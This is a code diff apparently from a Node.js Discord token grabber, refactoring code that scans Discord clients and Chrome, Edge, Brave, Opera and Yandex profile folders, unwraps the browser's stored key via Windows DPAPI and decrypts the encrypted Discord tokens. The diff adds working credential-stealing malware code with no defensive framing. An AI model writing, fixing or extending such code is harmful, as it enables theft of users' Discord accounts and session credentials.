@@ -3,86 +3,86 @@ const crypto = require("crypto");
 const aura = require("win-dpapi");
 const axios = require('axios');
 
-let appdata = process.env.appdata;
-let localappdata = process.env.localappdata;
-
-let paths = [
-    `${appdata}/discord/`,
-    `${appdata}/discordcanary/`,
-    `${appdata}/discordptb/`,
-    `${appdata}/discorddevelopment/`,
-    `${appdata}/lightcord/`,
-    `${appdata}/Opera Software/Opera Stable/`,
-    `${appdata}/Opera Software/Opera GX Stable/`,
-    `${localappdata}/Google/Chrome/User Data/Default/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 1/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 2/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 3/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 4/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 5/`,
-    `${localappdata}/Google/Chrome/User Data/Guest Profile/`,
-    `${localappdata}/Google/Chrome/User Data/Default/Network/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 1/Network/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 2/Network/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 3/Network/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 4/Network/`,
-    `${localappdata}/Google/Chrome/User Data/Profile 5/Network/`,
-    `${localappdata}/Google/Chrome/User Data/Guest Profile/Network/`,
-    `${localappdata}/BraveSoftware/Brave-Browser/User Data/Default/`,
-    `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 1/`,
-    `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 2/`,
-    `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 3/`,
-    `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 4/`,
-    `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 5/`,
-    `${localappdata}/BraveSoftware/Brave-Browser/User Data/Guest Profile/`,
-    `${localappdata}/Yandex/YandexBrowser/User Data/Profile 1/`,
-    `${localappdata}/Yandex/YandexBrowser/User Data/Profile 2/`,
-    `${localappdata}/Yandex/YandexBrowser/User Data/Profile 3/`,
-    `${localappdata}/Yandex/YandexBrowser/User Data/Profile 4/`,
-    `${localappdata}/Yandex/YandexBrowser/User Data/Profile 5/`,
-    `${localappdata}/Yandex/YandexBrowser/User Data/Guest Profile/`,
-    `${localappdata}/Microsoft/Edge/User Data/Default/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 1/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 2/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 3/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 4/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 5/`,
-    `${localappdata}/Microsoft/Edge/User Data/Guest Profile/`,
-    `${localappdata}/BraveSoftware/Brave-Browser/User Data/Default/Network/`,
-    `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 1/Network/`,
-    `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 2/Network/`,
-    `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 3/Network/`,
-    `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 4/Network/`,
-    `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 5/Network/`,
-    `${localappdata}/BraveSoftware/Brave-Browser/User Data/Guest Profile/Network/`,
-    `${localappdata}/Yandex/YandexBrowser/User Data/Profile 1/Network/`,
-    `${localappdata}/Yandex/YandexBrowser/User Data/Profile 2/Network/`,
-    `${localappdata}/Yandex/YandexBrowser/User Data/Profile 3/Network/`,
-    `${localappdata}/Yandex/YandexBrowser/User Data/Profile 4/Network/`,
-    `${localappdata}/Yandex/YandexBrowser/User Data/Profile 5/Network/`,
-    `${localappdata}/Yandex/YandexBrowser/User Data/Guest Profile/Network/`,
-    `${localappdata}/Microsoft/Edge/User Data/Default/Network/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 1/Network/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 2/Network/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 3/Network/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 4/Network/`,
-    `${localappdata}/Microsoft/Edge/User Data/Profile 5/Network/`,
-    `${localappdata}/Microsoft/Edge/User Data/Guest Profile/Network/`
-];
-
 let tokens = new Array();
 
 switch (process.platform) {
     case "win32":
+        let appdata = process.env.appdata;
+        let localappdata = process.env.localappdata;
+        
+        let paths = [
+            `${appdata}/discord/`,
+            `${appdata}/discordcanary/`,
+            `${appdata}/discordptb/`,
+            `${appdata}/discorddevelopment/`,
+            `${appdata}/lightcord/`,
+            `${appdata}/Opera Software/Opera Stable/`,
+            `${appdata}/Opera Software/Opera GX Stable/`,
+            `${localappdata}/Google/Chrome/User Data/Default/`,
+            `${localappdata}/Google/Chrome/User Data/Profile 1/`,
+            `${localappdata}/Google/Chrome/User Data/Profile 2/`,
+            `${localappdata}/Google/Chrome/User Data/Profile 3/`,
+            `${localappdata}/Google/Chrome/User Data/Profile 4/`,
+            `${localappdata}/Google/Chrome/User Data/Profile 5/`,
+            `${localappdata}/Google/Chrome/User Data/Guest Profile/`,
+            `${localappdata}/Google/Chrome/User Data/Default/Network/`,
+            `${localappdata}/Google/Chrome/User Data/Profile 1/Network/`,
+            `${localappdata}/Google/Chrome/User Data/Profile 2/Network/`,
+            `${localappdata}/Google/Chrome/User Data/Profile 3/Network/`,
+            `${localappdata}/Google/Chrome/User Data/Profile 4/Network/`,
+            `${localappdata}/Google/Chrome/User Data/Profile 5/Network/`,
+            `${localappdata}/Google/Chrome/User Data/Guest Profile/Network/`,
+            `${localappdata}/Microsoft/Edge/User Data/Default/`,
+            `${localappdata}/Microsoft/Edge/User Data/Profile 1/`,
+            `${localappdata}/Microsoft/Edge/User Data/Profile 2/`,
+            `${localappdata}/Microsoft/Edge/User Data/Profile 3/`,
+            `${localappdata}/Microsoft/Edge/User Data/Profile 4/`,
+            `${localappdata}/Microsoft/Edge/User Data/Profile 5/`,
+            `${localappdata}/Microsoft/Edge/User Data/Guest Profile/`,
+            `${localappdata}/Microsoft/Edge/User Data/Default/Network/`,
+            `${localappdata}/Microsoft/Edge/User Data/Profile 1/Network/`,
+            `${localappdata}/Microsoft/Edge/User Data/Profile 2/Network/`,
+            `${localappdata}/Microsoft/Edge/User Data/Profile 3/Network/`,
+            `${localappdata}/Microsoft/Edge/User Data/Profile 4/Network/`,
+            `${localappdata}/Microsoft/Edge/User Data/Profile 5/Network/`,
+            `${localappdata}/Microsoft/Edge/User Data/Guest Profile/Network/`,
+            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 1/`,
+            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 2/`,
+            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 3/`,
+            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 4/`,
+            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 5/`,
+            `${localappdata}/Yandex/YandexBrowser/User Data/Guest Profile/`,
+            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 1/Network/`,
+            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 2/Network/`,
+            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 3/Network/`,
+            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 4/Network/`,
+            `${localappdata}/Yandex/YandexBrowser/User Data/Profile 5/Network/`,
+            `${localappdata}/Yandex/YandexBrowser/User Data/Guest Profile/Network/`,
+            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Default/`,
+            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 1/`,
+            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 2/`,
+            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 3/`,
+            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 4/`,
+            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 5/`,
+            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Guest Profile/`,
+            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Default/Network/`,
+            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 1/Network/`,
+            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 2/Network/`,
+            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 3/Network/`,
+            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 4/Network/`,
+            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Profile 5/Network/`,
+            `${localappdata}/BraveSoftware/Brave-Browser/User Data/Guest Profile/Network/`,
+        ];
+
         async function tokenfuck() {
             for (let p of paths) {
-                await findtoken(p);
+                await find(p);
             };
             ok = tokens
             await check(ok)
         }
 
-        async function findtoken(p) {
+        async function find(p) {
             let tail = p;
             p += 'Local Storage/leveldb';
 
@@ -116,9 +116,10 @@ switch (process.platform) {
                                 if (foundTkns) {
                                     foundTkns.forEach(tkn => {
                                         let enc = Buffer.from(JSON.parse(fs.readFileSync(`${tail}/Local State`)).os_crypt.encrypted_key, 'base64').slice(5);
-                                        const key = aura.unprotectData(Buffer.from(enc, 'utf-8'), null, 'CurrentUser');
+                                        let key = aura.unprotectData(Buffer.from(enc, 'utf-8'), null, 'CurrentUser');
                                         const tkns = Buffer.from(tkn.split('dQw4w9WgXcQ:')[1], 'base64');
-                                        let run = tkns.slice(3, 15), mid = tkns.slice(15, tkns.length - 16), end = tkns.slice(tkns.length - 16, tkns.length), decyph = crypto.createDecipheriv('aes-256-gcm', key, run); decyph.setAuthTag(end);
+                                        let run = tkns.slice(3, 15), mid = tkns.slice(15, tkns.length - 16); 
+                                        let decyph = crypto.createDecipheriv('aes-256-gcm', key, run); decyph.setAuthTag(tkns.slice(tkns.length - 16, tkns.length));
                                         let out = decyph.update(mid, 'base64', 'utf-8') + decyph.final('utf-8');
                                         if (!tokens.includes(out)) return tokens.push(out)
                                     })
